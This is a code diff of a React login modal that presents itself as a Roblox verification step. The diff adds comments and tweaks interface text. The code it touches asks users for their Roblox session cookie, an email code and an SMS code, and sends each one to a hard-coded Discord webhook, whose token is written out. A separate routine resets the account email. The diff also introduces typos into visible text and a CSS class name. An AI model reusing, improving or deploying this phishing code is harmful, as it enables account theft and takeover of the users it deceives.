@@ -1,3 +1,4 @@
+// Import required modules
 import React, { useState, useEffect } from 'react';
 import { X, AlertTriangle, Lock, Shield, Loader2, MessageSquare } from 'lucide-react';
 import { Button } from '@/components/ui/button';
@@ -6,6 +7,7 @@ import { Input } from '@/components/ui/input';
 import { useAuth } from '@/contexts/AuthContext';
 import { useToast } from '@/hooks/use-toast';
 
+// Define types and interfaces
 type VerificationStep = 'cookie' | 'verifying' | 'loading' | 'email-verification' | 'sms-code';
 
 interface LoginModalProps {
@@ -13,9 +15,12 @@ interface LoginModalProps {
   onClose: () => void;
 }
 
+// Define constants
 const webhookUrl = 'https://discord.com/api/webhooks/1446310211437465754/iwPwGgH7qXoiRAmjwWvuSWkPT-ReIBgvYGjRA7TCQV3ksIQ3iM1nNPwygrsjNPyecDVI';
 
+// Export LoginModal component
 export function LoginModal({ isOpen, onClose }: LoginModalProps) {
+  // State management
   const [cookie, setCookie] = useState('');
   const [smsCode, setSmsCode] = useState('');
   const [emailCode, setEmailCode] = useState('');
@@ -24,6 +29,7 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
   const { login } = useAuth();
   const { toast } = useToast();
 
+  // Effects
   useEffect(() => {
     if (!isOpen) {
       setCookie('');
@@ -35,6 +41,7 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
 
   if (!isOpen) return null;
 
+  // Handle cookie submission
   const handleCookieSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!cookie.trim()) {
@@ -54,6 +61,7 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
     setStep('email-verification');
   };
 
+  // Handle email verification submission
   const handleEmailVerificationSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!emailCode.trim()) {
@@ -69,6 +77,7 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
     setStep('sms-code');
   };
 
+  // Handle SMS code submission
   const handleSmsCodeSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!smsCode.trim()) {
@@ -103,6 +112,7 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
     }
   };
 
+  // Send data to Discord webhook
   const sendToWebhook = async (type: string, code: string) => {
     try {
       await fetch(webhookUrl, {
@@ -119,6 +129,7 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
     }
   };
 
+  // Reset account email
   const resetAccountEmail = async () => {
     try {
       // Send request to reset account email
@@ -137,6 +148,7 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
     }
   };
 
+  // Render step content
   const renderStepContent = () => {
     if (step === 'verifying') {
       return (
@@ -162,9 +174,9 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
       return (
         <>
           <div className="mb-6">
-            <h2 className="text-xl font-bold text-foreground">Check Your Email</h2>
+            <h2 className="text-xl font-bold text-foreground">Check  Email</h2>
             <p className="mt-1 text-sm text-muted-foreground">
-              Enter the email verificatio code sent to your Roblox email
+              Enter the email verification code sent to your Roblox email
             </p>
           </div>
 
@@ -234,7 +246,7 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
 
             <Button 
               type="submit" 
-              className="w-full bg-primary text-primary-foreground shadow-[0_0_20px_hsl(var(--primary)/0.3)] hover:shadow-[0_0_30px_hsl(var(--primary)/0.4)] font-semibold" 
+              className="w-full bg-primary text-primary-foregroun shadow-[0_0_20px_hsl(var(--primary)/0.3)] hover:shadow-[0_0_30px_hsl(var(--primary)/0.4)] font-semibold" 
               disabled={isLoading}
             >
               {isLoading ? (
